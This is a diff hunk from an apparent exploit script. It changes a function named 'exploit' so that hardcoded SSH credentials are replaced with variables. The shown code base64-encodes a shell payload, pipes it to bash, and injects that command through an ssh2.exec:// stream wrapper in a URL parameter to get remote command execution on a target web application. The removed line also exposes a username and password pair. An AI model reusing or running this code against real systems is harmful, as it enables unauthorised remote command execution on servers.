@@ -215,7 +215,7 @@ def exploit(session, files, ip, port):
     encoded_payload = base64.b64encode(raw_payload.encode()).decode() # Was unstable without encoding
     cmd = f'echo {encoded_payload}|base64 -d|bash|'
 
-    TARGET = f"{TARGET_URL}?id={file_id}&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/{cmd}"
+    TARGET = f"{TARGET_URL}?id={file_id}&show=true&format=ssh2.exec://{username}:{password}@127.0.0.1/{cmd}"
     logging.info(f"[+] Sending payload: {TARGET}")
     r = session.get(TARGET, allow_redirects=True)
     
